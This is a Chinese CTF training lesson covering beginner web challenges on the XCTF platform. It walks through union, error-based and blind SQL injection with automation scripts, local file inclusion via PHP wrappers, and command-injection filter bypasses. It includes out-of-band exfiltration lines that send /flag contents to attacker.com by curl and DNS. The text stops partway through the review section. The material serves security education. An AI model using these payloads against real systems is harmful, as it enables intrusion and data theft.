# Day 32：攻防世界Web新手区实战（下）

> **学习目标**：继续完成攻防世界Web新手区题目，掌握SQL注入、文件包含、命令执行等核心漏洞的实战应用
>
> **学习时长**：3-4小时
>
> **难度等级**：⭐⭐⭐

---

## 📚 今日内容概览

1. Web新手区进阶题型概览
2. SQL注入类题目实战详解
3. 文件包含类题目实战详解
4. 命令执行类题目实战详解
5. 综合题目挑战与思路
6. 错题复盘与知识巩固
7. Web新手区通关总结

---

## 一、Web新手区进阶题型概览

### 1.1 今日重点题型

```
【今日学习的题型】

题型一：SQL注入类
  特点：需要利用SQL注入漏洞
  题目：
    - 数字型注入
    - 字符型注入
    - 报错注入
    - 布尔盲注
    - 时间盲注

题型二：文件包含类
  特点：需要利用文件包含漏洞
  题目：
    - 本地文件包含（LFI）
    - PHP伪协议使用
    - 路径绕过

题型三：命令执行类
  特点：需要利用命令执行漏洞
  题目：
    - 简单命令注入
    - 空格绕过
    - 关键字绕过

题型四：综合类
  特点：需要多种技术组合
  题目：
    - 信息搜集 + SQL注入
    - 目录扫描 + 文件包含
    - 多步骤解题

题型五：编码解码类
  特点：需要各种编码转换
  题目：
    - Base64解码
    - URL解码
    - 多层编码嵌套
```

### 1.2 题型难度分布

```
【难度等级说明】

⭐ 简单题（5-10分钟）
  - 直接应用已知Payload
  - 无过滤或简单过滤
  - 有明显提示

⭐⭐ 中等题（15-20分钟）
  - 需要简单绕过
  - 需要组合多个步骤
  - 提示不明显

⭐⭐⭐ 困难题（30分钟以上）
  - 需要复杂绕过
  - 需要代码审计
  - 需要创新思路

【今日目标】

必做题目：
  - SQL注入类：至少3道
  - 文件包含类：至少2道
  - 命令执行类：至少2道
  - 综合类：至少1道

选做题目：
  - 挑战困难题
  - 尝试不同解法
  - 整理解题套路
```

---

## 二、SQL注入类题目实战详解

### 2.1 SQL注入题目特点

```
【通俗易懂的解释】

SQL注入就像"骗过数据库管理员"：

  🗄️ 正常情况：
    你问："请告诉我用户ID为1的信息"
    数据库回答："好的，这是用户1的信息"

  💉 SQL注入：
    你问："请告诉我用户ID为'1 OR 1=1'的信息"
    数据库理解成："请告诉我用户ID为1，或者所有用户的信息"
    数据库回答："好的，这是所有用户的信息！"

在CTF中：
  - 题目有输入框或URL参数
  - 输入的内容会被拼接到SQL语句
  - 我们要构造特殊输入，让数据库返回敏感信息
  - 最终获取flag

常见SQL注入题目类型：
  - 数字型：参数是数字，不需要引号闭合
  - 字符型：参数是字符串，需要引号闭合
  - 报错注入：利用错误信息获取数据
  - 盲注：没有回显，需要通过其他方式判断
```

### 2.2 数字型注入实战

```
【题目特征】

URL格式：
  http://target.com/news.php?id=1

页面特征：
  - 显示某条新闻或用户信息
  - 修改id值会显示不同内容
  - 可能有多个数据展示

【解题步骤】

步骤1：判断是否存在注入
  测试：
    ?id=1        —— 正常显示
    ?id=1'       —— 报错或异常
    ?id=1 and 1=1 —— 正常显示
    ?id=1 and 1=2 —— 异常（数据消失）

  结论：
    如果and 1=1正常，and 1=2异常
    说明存在数字型注入

步骤2：判断列数
  测试：
    ?id=1 order by 1    —— 正常
    ?id=1 order by 2    —— 正常
    ?id=1 order by 3    —— 正常
    ?id=1 order by 4    —— 报错

  结论：
    说明有3列

步骤3：判断回显位置
  测试：
    ?id=-1 union select 1,2,3

  观察：
    页面显示2和3的位置
    这是我们的数据出口

步骤4：查询数据库名
  Payload：
    ?id=-1 union select 1,database(),3

  结果：
    页面显示数据库名，如"ctf_db"

步骤5：查询表名
  Payload：
    ?id=-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='ctf_db'

  结果：
    页面显示表名，如"users,flag"

步骤6：查询字段名
  Payload：
    ?id=-1 union select 1,group_concat(column_name),3 from information_schema.columns where table_name='flag'

  结果：
    页面显示字段名，如"id,flag_content"

步骤7：获取flag
  Payload：
    ?id=-1 union select 1,flag_content,3 from flag

  结果：
    页面显示flag：flag{sql_1nj3ct10n_m4st3r}

【实战示例】

假设题目URL：http://123.45.67.89:8000/news.php?id=1

完整解题过程：
  1. ?id=1 and 1=2 —— 数据消失，确认注入
  2. ?id=1 order by 3 —— 正常，order by 4报错，共3列
  3. ?id=-1 union select 1,2,3 —— 看到2和3的位置
  4. ?id=-1 union select 1,database(),3 —— 数据库名：test
  5. ?id=-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='test' —— 表名：flag
  6. ?id=-1 union select 1,group_concat(column_name),3 from information_schema.columns where table_name='flag' —— 字段名：flag
  7. ?id=-1 union select 1,flag,3 from flag —— flag{xxx}
```

### 2.3 字符型注入实战

```
【题目特征】

URL格式：
  http://target.com/search.php?name=admin

页面特征：
  - 显示搜索结果
  - 参数是字符串类型
  - 需要引号闭合

【与数字型的区别】

数字型：
  SQL语句：SELECT * FROM users WHERE id=1
  Payload：?id=1 and 1=2
  不需要引号

字符型：
  SQL语句：SELECT * FROM users WHERE name='admin'
  Payload：?name=admin' and '1'='1
  需要引号闭合

【解题步骤】

步骤1：判断闭合方式
  测试：
    ?name=admin'        —— 报错
    ?name=admin'#       —— 正常（单引号闭合）
    ?name=admin"--      —— 报错（不是双引号闭合）

  结论：
    使用单引号闭合，#注释后面内容

步骤2：判断列数
  Payload：
    ?name=admin' order by 3#    —— 正常
    ?name=admin' order by 4#    —— 报错

  结论：
    共3列

步骤3：判断回显位置
  Payload：
    ?name=-1' union select 1,2,3#

  观察：
    页面显示2和3的位置

步骤4：查询数据库信息
  Payload：
    ?name=-1' union select 1,database(),3#

  结果：
    数据库名：ctf_db

步骤5：查询表名
  Payload：
    ?name=-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='ctf_db'#

  结果：
    表名：users,flag

步骤6：获取flag
  Payload：
    ?name=-1' union select 1,flag,3 from flag#

  结果：
    flag{ch4r_1nj3ct10n}

【常见闭合方式】

单引号闭合：
  ?name=admin' and '1'='1
  ?name=admin'#

双引号闭合：
  ?name=admin" and "1"="1
  ?name=admin"--

括号闭合：
  ?name=admin') and ('1'='1
  ?name=admin')#

组合闭合：
  ?name=admin') union select 1,2,3#

判断方法：
  逐个尝试，看哪个能正常执行
```

### 2.4 报错注入实战

```
【题目特征】

页面特征：
  - 有错误信息显示
  - 没有数据回显位置
  - union select无法获取数据

【报错注入原理】

利用MySQL的错误函数：
  - updatexml()：更新XML文档
  - extractvalue()：提取XML值
  - floor()：配合rand()产生重复键错误

当这些函数的参数包含SQL查询时：
  - 错误信息会显示查询结果
  - 我们可以从错误信息中获取数据

【updatexml报错注入】

函数格式：
  updatexml(XML_document, XPath_string, new_value)

报错原理：
  当XPath_string格式错误时，会报错并显示XPath_string的内容

Payload格式：
  ?id=1 and updatexml(1,concat(0x7e,(SELECT ...),0x7e),1)

解释：
  0x7e是~的十六进制，用于标记边界
  concat把查询结果和边界符拼接
  updatexml因为XPath格式错误而报错
  错误信息中显示查询结果

【实战示例】

假设题目URL：http://123.45.67.89:8000/news.php?id=1

步骤1：测试报错注入
  Payload：
    ?id=1 and updatexml(1,concat(0x7e,'test',0x7e),1)

  结果：
    错误信息：XPATH syntax error: '~test~'
    说明报错注入可行

步骤2：获取数据库名
  Payload：
    ?id=1 and updatexml(1,concat(0x7e,database(),0x7e),1)

  结果：
    错误信息：XPATH syntax error: '~ctf_db~'
    数据库名：ctf_db

步骤3：获取表名
  Payload：
    ?id=1 and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='ctf_db'),0x7e),1)

  结果：
    错误信息：XPATH syntax error: '~flag,users~'
    表名：flag,users

步骤4：获取字段名
  Payload：
    ?id=1 and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='flag'),0x7e),1)

  结果：
    错误信息：XPATH syntax error: '~flag~'
    字段名：flag

步骤5：获取flag
  Payload：
    ?id=1 and updatexml(1,concat(0x7e,(select flag from flag),0x7e),1)

  结果：
    错误信息：XPATH syntax error: '~flag{err0r_1nj~'
    注意：updatexml最多显示32字符

步骤6：获取完整flag（如果flag较长）
  Payload：
    ?id=1 and updatexml(1,concat(0x7e,substr((select flag from flag),1,30),0x7e),1)
    ?id=1 and updatexml(1,concat(0x7e,substr((select flag from flag),31,30),0x7e),1)

  结果：
    拼接两段结果得到完整flag

【extractvalue报错注入】

函数格式：
  extractvalue(XML_document, XPath_string)

Payload格式：
  ?id=1 and extractvalue(1,concat(0x7e,(SELECT ...),0x7e))

用法与updatexml类似
```

### 2.5 布尔盲注实战

```
【题目特征】

页面特征：
  - 没有错误信息
  - 没有数据回显
  - 只有"存在"或"不存在"两种状态

【布尔盲注原理】

通过页面状态变化判断：
  - 如果条件为真，页面显示A
  - 如果条件为假，页面显示B

通过不断测试，逐字符获取数据

【解题步骤】

步骤1：确认盲注
  测试：
    ?id=1 and 1=1 —— 页面显示"用户存在"
    ?id=1 and 1=2 —— 页面显示"用户不存在"

  结论：
    存在布尔盲注

步骤2：获取数据库名长度
  Payload：
    ?id=1 and length(database())=1 —— 不存在
    ?id=1 and length(database())=2 —— 不存在
    ?id=1 and length(database())=3 —— 不存在
    ?id=1 and length(database())=4 —— 存在

  结论：
    数据库名长度为4

步骤3：获取数据库名第一个字符
  Payload：
    ?id=1 and substr(database(),1,1)='a' —— 不存在
    ?id=1 and substr(database(),1,1)='b' —— 不存在
    ?id=1 and substr(database(),1,1)='c' —— 存在

  结论：
    第一个字符是'c'

步骤4：逐字符获取完整数据库名
  Payload：
    ?id=1 and substr(database(),2,1)='t' —— 存在
    ?id=1 and substr(database(),3,1)='f' —— 存在
    ?id=1 and substr(database(),4,1)='_' —— 存在

  结论：
    数据库名：ctf_

步骤5：继续获取表名、字段名、flag
  方法相同，逐字符测试

【使用Python脚本自动化】

```python
import requests

url = "http://target.com/news.php?id=1"
result = ""

# 获取数据库名
for i in range(1, 50):
    for c in range(32, 127):
        payload = f" and substr(database(),{i},1)='{chr(c)}'"
        r = requests.get(url + payload)
        if "存在" in r.text:
            result += chr(c)
            print(f"数据库名: {result}")
            break
    if len(result) < i:
        break

print(f"完整数据库名: {result}")
```

【布尔盲注技巧】

技巧1：使用二分法加速
  不用逐个字符测试，用ascii值二分：
    ?id=1 and ascii(substr(database(),1,1))>64
    ?id=1 and ascii(substr(database(),1,1))>96
    ?id=1 and ascii(substr(database(),1,1))>80
    ...

技巧2：使用Burp Intruder自动化
  1. 抓包发送到Intruder
  2. 设置payload位置
  3. 加载字符字典
  4. 根据响应长度判断正确字符

技巧3：注意过滤
  如果等号被过滤：
    ?id=1 and substr(database(),1,1) like 'c'
  如果引号被过滤：
    ?id=1 and ascii(substr(database(),1,1))=99
```

### 2.6 时间盲注实战

```
【题目特征】

页面特征：
  - 没有任何回显变化
  - 页面状态始终相同
  - 无法通过页面判断

【时间盲注原理】

利用sleep()函数：
  - 如果条件为真，执行sleep(5)
  - 页面响应延迟5秒
  - 如果条件为假，不执行sleep
  - 页面正常响应

通过响应时间判断条件真假

【解题步骤】

步骤1：确认时间盲注
  Payload：
    ?id=1 and sleep(5)

  观察：
    页面响应延迟5秒
    说明时间盲注可行

步骤2：获取数据库名长度
  Payload：
    ?id=1 and if(length(database())=4,sleep(5),0)

  观察：
    响应延迟5秒，说明长度为4

步骤3：获取数据库名第一个字符
  Payload：
    ?id=1 and if(substr(database(),1,1)='c',sleep(5),0)

  观察：
    响应延迟5秒，说明第一个字符是'c'

步骤4：逐字符获取完整数据库名
  Payload：
    ?id=1 and if(substr(database(),2,1)='t',sleep(5),0)
    ?id=1 and if(substr(database(),3,1)='f',sleep(5),0)
    ?id=1 and if(substr(database(),4,1)='_',sleep(5),0)

  结论：
    数据库名：ctf_

【使用Python脚本自动化】

```python
import requests
import time

url = "http://target.com/news.php?id=1"
result = ""

def check(payload):
    start = time.time()
    r = requests.get(url + payload)
    end = time.time()
    return end - start > 4

# 获取数据库名
for i in range(1, 50):
    for c in range(32, 127):
        payload = f" and if(substr(database(),{i},1)='{chr(c)}',sleep(5),0)"
        if check(payload):
            result += chr(c)
            print(f"数据库名: {result}")
            break
    if len(result) < i:
        break

print(f"完整数据库名: {result}")
```

【时间盲注技巧】

技巧1：设置合适的延迟时间
  - 太短：可能误判
  - 太长：效率低
  - 推荐：3-5秒

技巧2：注意网络延迟
  - 测试时先记录正常响应时间
  - 判断时要考虑网络波动

技巧3：使用Benchmark替代sleep
  如果sleep被过滤：
    ?id=1 and if(condition,BENCHMARK(10000000,SHA1('test')),0)
  Benchmark会消耗CPU时间，产生延迟
```

---

## 三、文件包含类题目实战详解

### 3.1 文件包含题目特点

```
【通俗易懂的解释】

文件包含就像"神奇的传送门"：

  🚪 正常情况：
    你告诉传送门："请把about.php的内容传送过来"
    传送门回答："好的，这是about.php的内容"

  📁 文件包含漏洞：
    你告诉传送门："请把../../../etc/passwd的内容传送过来"
    传送门没有检查地址，回答："好的，这是/etc/passwd的内容！"

在CTF中：
  - 题目URL有file参数
  - 如 ?file=about.php
  - 我们可以修改file参数
  - 包含其他文件获取flag

常见文件包含题目类型：
  - 本地文件包含（LFI）
  - PHP伪协议使用
  - 路径绕过
  - 后缀绕过
```

### 3.2 本地文件包含实战

```
【题目特征】

URL格式：
  http://target.com/index.php?file=about.php

页面特征：
  - 显示被包含文件的内容
  - 修改file参数会显示不同内容

【解题步骤】

步骤1：测试文件包含
  Payload：
    ?file=../../../etc/passwd

  结果：
    如果显示passwd内容，说明存在LFI

步骤2：尝试读取flag文件
  Payload：
    ?file=../../../flag
    ?file=/flag
    ?file=../flag
    ?file=../../flag

  结果：
    如果找到flag文件，直接获取flag

步骤3：如果直接读取失败
  原因：
    - 文件路径不对
    - 有后缀限制
    - 有路径过滤

  解决：
    - 尝试不同路径
    - 使用伪协议
    - 绕过过滤

【实战示例】

假设题目URL：http://123.45.67.89:8000/index.php?file=about.php

步骤1：测试LFI
  ?file=../../../etc/passwd
  显示passwd内容，确认LFI存在

步骤2：尝试读取flag
  ?file=../../../flag —— 404
  ?file=/flag —— 404
  ?file=../flag —— 404

步骤3：使用伪协议读取源码
  ?file=php://filter/convert.base64-encode/resource=index.php
  显示Base64编码的内容

步骤4：解码Base64
  解码后发现：
    <?php
    $flag = "flag{lfi_1s_3z}";
    ?>

步骤5：获取flag
  flag{lfi_1s_3z}
```

### 3.3 PHP伪协议实战

```
【五大伪协议详解】

1. php://filter —— 读取源代码
  用法：
    ?file=php://filter/convert.base64-encode/resource=index.php

  解释：
    - 把index.php的内容用Base64编码输出
    - 因为PHP文件直接包含会执行代码
    - 编码后可以看到源码

  适用场景：
    - 需要读取PHP源码
    - 找flag或敏感信息

2. php://input —— 执行POST数据
  用法：
    ?file=php://input
    POST数据：<?php system('ls'); ?>

  解释：
    - 把POST的数据当作PHP代码执行
    - 需要allow_url_include = On

  适用场景：
    - 需要执行PHP代码
    - 获取系统信息

3. data:// —— 执行数据
  用法：
    ?file=data://text/plain,<?php system('cat /flag');?>
    ?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgL2ZsYWcnKTsgPz4=

  解释：
    - 把数据当作文件内容
    - 可以直接执行代码

  适用场景：
    - 需要执行自定义代码
    - 获取flag

4. file:// —— 读取本地文件
  用法：
    ?file=file:///etc/passwd
    ?file=file:///var/www/html/config.php

  解释：
    - 读取本地绝对路径文件
    - 不经过PHP处理

  适用场景：
    - 读取绝对路径文件
    - 读取敏感配置

5. zip:// —— 读取压缩包内文件
  用法：
    ?file=zip://upload/shell.zip%23shell.php

  解释：
    - %23是#的URL编码
    - 读取zip压缩包内的shell.php

  适用场景：
    - 有上传功能
    - 上传zip后包含执行

【伪协议实战示例】

假设题目URL：http://123.45.67.89:8000/index.php?file=about.php

场景1：读取源码找flag
  ?file=php://filter/convert.base64-encode/resource=flag.php
  解码Base64：<?php $flag="flag{xxx}"; ?>

场景2：执行代码获取flag
  ?file=php://input
  POST: <?php system('cat /flag'); ?>

场景3：使用data协议
  ?file=data://text/plain,<?php echo file_get_contents('/flag'); ?>

场景4：读取绝对路径
  ?file=file:///flag
```

### 3.4 路径绕过实战

```
【常见过滤类型】

过滤类型1：过滤../
  代码：
    if(strpos($file, '../') !== false) {
      die('Hacker!');
    }

  绕过方法：
    ....//（双写绕过）
    ..././（中间加点）
    ..%2f（URL编码）
    ..%252f（双重编码）

过滤类型2：限制路径
  代码：
    include("pages/" . $file);

  绕过方法：
    ?file=../../../etc/passwd
    使用../跳出限制目录

过滤类型3：限制后缀
  代码：
    include($file . ".php");

  绕过方法：
    使用伪协议（不需要后缀）
    空字节截断（PHP<5.3.4）：?file=../../../etc/passwd%00

【实战示例】

假设题目URL：http://123.45.67.89:8000/index.php?file=about

代码：include($file . ".php");

尝试1：直接读取flag
  ?file=/flag
  实际执行：include("/flag.php");
  结果：404

尝试2：使用伪协议
  ?file=php://filter/convert.base64-encode/resource=/flag
  实际执行：include("php://filter/.../flag.php");
  结果：成功读取flag.php源码

尝试3：空字节截断（如果PHP版本低）
  ?file=/flag%00
  实际执行：include("/flag");（%00截断后面的.php）
  结果：成功读取flag

【路径绕过Payload速查】

基础绕过：
  ?file=../../../etc/passwd
  ?file=/etc/passwd

双写绕过：
  ?file=....//....//....//etc/passwd

编码绕过：
  ?file=..%2f..%2f..%2fetc/passwd
  ?file=..%252f..%252f..%252fetc/passwd

伪协议绕过：
  ?file=php://filter/convert.base64-encode/resource=index
  ?file=php://input
  ?file=data://text/plain,<?php system('ls');?>
```

---

## 四、命令执行类题目实战详解

### 4.1 命令执行题目特点

```
【通俗易懂的解释】

命令执行就像"骗过服务员"：

  🍽️ 正常情况：
    你说："我要ping 127.0.0.1"
    服务员执行：ping 127.0.0.1

  💻 命令执行漏洞：
    你说："我要ping 127.0.0.1; cat /flag"
    服务员执行：ping 127.0.0.1 和 cat /flag

在CTF中：
  - 题目有执行命令的功能
  - 如ping、nslookup等
  - 我们可以注入额外命令
  - 获取flag

常见命令执行题目类型：
  - ping命令注入
  - 简单命令执行
  - 过滤绕过
  - 无回显命令执行
```

### 4.2 基础命令注入实战

```
【题目特征】

URL格式：
  http://target.com/ping.php?ip=127.0.0.1

页面特征：
  - 显示ping命令结果
  - 有输入框或URL参数

【命令连接符详解】

; 分号 —— 顺序执行
  用法：command1;command2
  示例：ping 127.0.0.1;cat /flag
  结果：先ping，再cat /flag

| 管道 —— 传递输出
  用法：command1|command2
  示例：ping 127.0.0.1|cat /flag
  结果：ping的输出传给cat（实际是cat执行）

|| 或运算 —— 失败才执行
  用法：command1||command2
  示例：ping xxx||cat /flag
  结果：ping失败才执行cat

&& 与运算 —— 成功才执行
  用法：command1&&command2
  示例：ping 127.0.0.1&&cat /flag
  结果：ping成功才执行cat

【解题步骤】

步骤1：测试命令注入
  Payload：
    ?ip=127.0.0.1;ls

  结果：
    如果显示ls结果，说明存在命令注入

步骤2：查找flag文件
  Payload：
    ?ip=127.0.0.1;find / -name flag

  结果：
    找到flag文件位置

步骤3：读取flag
  Payload：
    ?ip=127.0.0.1;cat /flag

  结果：
    显示flag内容

【实战示例】

假设题目URL：http://123.45.67.89:8000/ping.php?ip=127.0.0.1

步骤1：测试注入
  ?ip=127.0.0.1;ls
  显示目录列表，确认注入存在

步骤2：查找flag
  ?ip=127.0.0.1;find / -name "*flag*"
  显示：/flag.txt

步骤3：读取flag
  ?ip=127.0.0.1;cat /flag.txt
  显示：flag{cmd_1nj3ct10n}
```

### 4.3 空格绕过实战

```
【题目特征】

过滤特征：
  - 输入空格后报错
  - 提示"非法字符"
  - 命令无法执行

【空格绕过方法】

方法1：$IFS变量
  $IFS是内部字段分隔符
  默认包含空格、Tab、换行

  Payload：
    cat$IFS/flag
    cat$IFS$9/flag

方法2：${IFS}变量
  用花括号包裹IFS

  Payload：
    cat${IFS}/flag

方法3：Tab字符
  Tab的URL编码是%09

  Payload：
    cat%09/flag

方法4：花括号扩展
  Payload：
    {cat,/flag}

方法5：重定向
  Payload：
    cat</flag

【实战示例】

假设题目过滤了空格

尝试1：使用$IFS
  ?ip=127.0.0.1;cat$IFS/flag
  成功执行

尝试2：使用%09
  ?ip=127.0.0.1;cat%09/flag
  成功执行

尝试3：使用花括号
  ?ip=127.0.0.1;{cat,/flag}
  成功执行

【空格绕过Payload速查】

cat$IFS/flag
cat$IFS$9/flag
cat${IFS}/flag
cat%09/flag
{cat,/flag}
cat</flag
```

### 4.4 关键字绕过实战

```
【题目特征】

过滤特征：
  - 输入cat后报错
  - 输入flag后报错
  - 提示"敏感词"

【关键字绕过方法】

方法1：空字符串分割
  Payload：
    ca''t /fl''ag
    ca""t /fl""ag

  解释：
    ''和""是空字符串，不影响命令

方法2：反斜杠转义
  Payload：
    ca\t /fl\ag

  解释：
    反斜杠不影响命令执行

方法3：变量拼接
  Payload：
    a=cat;b=/flag;$a $b

  解释：
    通过变量拼接绕过过滤

方法4：通配符
  Payload：
    cat /fl*
    cat /fl?g
    cat /f[a-z]ag

  解释：
    使用通配符匹配文件名

方法5：替代命令
  Payload：
    more /flag
    less /flag
    head /flag
    tail /flag
    dd if=/flag

  解释：
    使用其他命令替代cat

方法6：编码
  Payload：
    echo "Y2F0IC9mbGFn"|base64 -d|bash

  解释：
    Y2F0IC9mbGFn = cat /flag（Base64编码）

【实战示例】

假设题目过滤了cat和flag

尝试1：空字符串分割
  ?ip=127.0.0.1;ca''t /fl''ag
  成功执行

尝试2：变量拼接
  ?ip=127.0.0.1;a=cat;b=/flag;$a$b
  成功执行

尝试3：通配符
  ?ip=127.0.0.1;cat /f*
  成功执行

尝试4：替代命令
  ?ip=127.0.0.1;head /flag
  成功执行

【关键字绕过Payload速查】

cat绕过：
  ca''t、ca\t、head、more、less、tail

flag绕过：
  fl''ag、fl\ag、fl*、fl?g、f[a-z]ag

组合绕过：
  ca''t$IFS/fl''ag
  head$IFS$9/f*
```

### 4.5 无回显命令执行实战

```
【题目特征】

页面特征：
  - 命令执行了但没有输出
  - 页面显示"执行成功"
  - 无法直接看到结果

【无回显处理方法】

方法1：写入文件
  Payload：
    ?ip=127.0.0.1;cat /flag > /var/www/html/output.txt

  步骤：
    1. 执行命令，把结果写入文件
    2. 访问/output.txt查看结果

方法2：外带数据（curl）
  Payload：
    ?ip=127.0.0.1;curl http://your-server.com/?data=$(cat /flag)

  步骤：
    1. 在你的服务器上监听请求
    2. 执行命令，flag会发送到你的服务器

方法3：外带数据（DNS）
  Payload：
    ?ip=127.0.0.1;nslookup $(cat /flag).your-server.com

  步骤：
    1. 在你的DNS服务器上查看日志
    2. flag会出现在DNS查询中

方法4：时间盲注
  Payload：
    ?ip=127.0.0.1;if [ $(cat /flag | head -c 1) = "f" ];then sleep 5;fi

  步骤：
    1. 通过响应时间判断字符
    2. 逐字符获取flag

【实战示例】

假设题目无回显

方法1：写入文件
  ?ip=127.0.0.1;cat /flag > output.txt
  访问：http://target.com/output.txt
  显示：flag{xxx}

方法2：curl外带
  ?ip=127.0.0.1;curl http://attacker.com/log.php?d=$(cat /flag|base64)
  在attacker.com的日志中看到Base64编码的flag
  解码得到flag

方法3：DNS外带
  ?ip=127.0.0.1;ping $(cat /flag).attacker.com
  在attacker.com的DNS日志中看到flag
```

---

## 五、综合题目挑战与思路

### 5.1 综合题目特点

```
【综合题目的特点】

特点1：多步骤解题
  - 不是一步到位
  - 需要多个操作组合
  - 每一步都有线索

特点2：多技术组合
  - 信息搜集 + 漏洞利用
  - 目录扫描 + 代码审计
  - 多种漏洞串联

特点3：线索隐藏
  - 需要仔细观察
  - 需要分析代码
  - 需要推理判断

【综合题目解题思路】

思路1：先信息搜集
  - 扫描目录
  - 查看源码
  - 分析功能

思路2：找漏洞入口
  - 分析输入点
  - 测试常见漏洞
  - 确定漏洞类型

思路3：利用漏洞
  - 构造Payload
  - 绕过过滤
  - 获取数据

思路4：继续深入
  - 分析获取的数据
  - 找到下一步线索
  - 继续利用

思路5：获取flag
  - 最终拿到flag
  - 验证正确性
  - 提交得分
```

### 5.2 综合题目实战示例

```
【题目：信息泄露 + SQL注入】

题目描述：
  一个新闻网站，需要找到隐藏的管理员密码

解题步骤：

步骤1：信息搜集
  1. 访问首页，查看页面
  2. 扫描目录：
     python dirsearch.py -u http://target.com -e php
     发现：/admin.php、/backup.zip

  3. 下载backup.zip，解压得到源码
     发现SQL语句：SELECT * FROM news WHERE id=$id

步骤2：分析漏洞
  1. 查看news.php?id=1
  2. 测试SQL注入：
     ?id=1 and 1=2 —— 数据消失
     确认数字型注入

步骤3：SQL注入利用
  1. ?id=-1 union select 1,2,3 —— 找到回显位置
  2. ?id=-1 union select 1,database(),3 —— 数据库名：news_db
  3. ?id=-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='news_db' —— 表名：news,admin
  4. ?id=-1 union select 1,group_concat(column_name),3 from information_schema.columns where table_name='admin' —— 字段名：id,username,password
  5. ?id=-1 union select 1,password,3 from admin —— 密码：admin123

步骤4：登录后台
  1. 访问/admin.php
  2. 用户名：admin，密码：admin123
  3. 登录成功，看到flag

步骤5：获取flag
  flag{c0mb1n3d_4tt4ck}

【题目：目录扫描 + 文件包含】

题目描述：
  一个简单的页面，需要找到隐藏的flag

解题步骤：

步骤1：信息搜集
  1. 访问首页，显示"Welcome"
  2. 查看源码，发现：?file=welcome.php
  3. 扫描目录：
     python dirsearch.py -u http://target.com -e php
     发现：/flag.php

步骤2：测试文件包含
  1. ?file=flag.php —— 显示空白（PHP执行了但没输出）
  2. ?file=../../../flag.php —— 404

步骤3：使用伪协议
  1. ?file=php://filter/convert.base64-encode/resource=flag.php
  2. 得到Base64编码内容

步骤4：解码获取flag
  1. Base64解码
  2. 发现：<?php $flag="flag{xxx}"; ?>
  3. 获取flag

【题目：Git泄露 + 代码审计 + SQL注入】

题目描述：
  一个博客系统，需要获取管理员权限

解题步骤：

步骤1：信息搜集
  1. 扫描目录，发现/.git/
  2. 使用GitHack恢复源码
     python GitHack.py http://target.com/.git/

步骤2：代码审计
  1. 查看login.php源码
  2. 发现SQL语句：
     SELECT * FROM users WHERE username='$username' AND password='$password'
  3. 发现过滤：
     过滤了union、select、空格

步骤3：构造绕过Payload
  1. 绕过空格：使用%09
  2. 绕过union/select：使用大小写混合
     Payload：admin'%09UnIoN%09SeLeCt%091,2,3#

步骤4：SQL注入获取数据
  1. 获取管理员密码
  2. 登录后台

步骤5：获取flag
  登录后看到flag
```

### 5.3 综合题目解题技巧

```
【解题技巧总结】

技巧1：耐心信息搜集
  - 不要急于攻击
  - 先全面搜集信息
  - 信息越多，思路越多

技巧2：仔细代码审计
  - 源码是重要线索
  - 分析过滤逻辑
  - 找绕过方法

技巧3：多种漏洞组合
  - 不要局限于一种漏洞
  - 尝试多种攻击方式
  - 组合利用

技巧4：注意细节
  - 注释中可能有线索
  - 错误信息可能有提示
  - 文件名可能有暗示

技巧5：记录每一步
  - 记录发现的线索
  - 记录尝试的方法
  - 记录成功的Payload

技巧6：遇到卡点看WriteUp
  - 不要死磕太久
  - 20分钟没思路就看WriteUp
  - 学习新方法

【常见综合题目类型】

类型1：信息泄露 + 漏洞利用
  流程：扫描 → 发现源码 → 分析漏洞 → 利用

类型2：弱口令 + 后台漏洞
  流程：猜密码 → 登录后台 → 利用漏洞 → 获取flag

类型3：文件上传 + 文件包含
  流程：上传文件 → 包含执行 → 获取flag

类型4：多漏洞串联
  流程：漏洞A → 获取信息 → 漏洞B → 获取flag
```

---

## 六、错题复盘与知识巩固

### 6.1 错题复盘方法

```
【错题复盘的重要性】

为什么复盘？
  - 错题暴露知识盲区
  - 复盘可以巩固知识
  - 避免下次犯同样错误

复盘什么？
  - 卡在哪一步
  - 为什么卡住
  - 正确解法是什么
  - 学到了什么

【错题复盘模板】

┌─────────────────────────────────┐
│ 题目名称：XXX                    │
│ 题目类型：SQL注入/文件包含/...   │
│ 难度：⭐⭐⭐                      │
│ 用时：XX分钟                     │
│ 是否完成：否                     │
├─────────────────────────────────┤
│ 我的解题过程：                   │
│   1. 访问首页                    │
│   2. 测试?id=1 and 1=2          │
│   3. 发现注入存在                │
│   4. 尝试union select            │
│   5. 卡在：被过滤了              │
├─────────────────────────────────┤
│ 卡住原因分析：                   │
│   - 不知道union被过滤            │
│   - 不知道绕过方法               │
│   - 没有看源码                   │
├─────────────────────────────────┤
│ WriteUp解法：                    │
│   1. 先扫描发现.git泄露         │
│   2. 恢复源码，看到过滤逻辑     │
│   3. 使用大小写混合绕过          │
│   4. UnIoN SeLeCt 成功          │
├─────────────────────────────────┤
│ 学到的知识：                     │
│   - 先信息搜集再攻击             │
│   - 大小写混合可以绕过关键字过滤│
│   - Git泄露可以获取源码          │
├─────────────────────────────────┤
│ 关键Payload：                    │
│   ?id=-1' UnIoN SeLeCt 1,2,3#   │
├─────────────────────────────────┤
│ 是否重做：✓                      │
│ 重做用时：10分钟                 │
└─────────────────────────────────┘
```

### 6.2 知识巩固方法

```
【知识巩固三步法】

第一步：理解原理
  - 为什么这个漏洞存在
  - Payload为什么有效
  - 绕过方法的原理

第二步：动手实践
  - 自己构造Payload
  - 在不同环境测试
  - 验证理解是否正确

第三步：总结归纳
  - 整理知识点
  - 制作知识卡片
  - 定期复习

【SQL注入知识巩固】

核心知识点：
  1. 判断注入类型（数字型/字符型）
  2. 判断闭合方式（单引号/双引号/括号）
  3. 判断列数（order by）
  4. 判断回显位置（union select）
  5. 查询数据（information_schema）
  6. 报错注入（updatexml）
  7. 盲注（布尔/时间）

巩固方法：
  - 手写完整注入流程
  - 不看笔记做一道题
  - 总结常见过滤和绕过

【文件包含知识巩固】

核心知识点：
  1. LFI基本利用
  2. PHP伪协议使用
  3. 路径绕过方法
  4. 后缀绕过方法

巩固方法：
  - 背诵五大伪协议
  - 练习不同绕过场景
  - 总结常见路径

【命令执行知识巩固】

核心知识点：
  1. 命令连接符（;、|、||、&&）
  2. 空格绕过方法
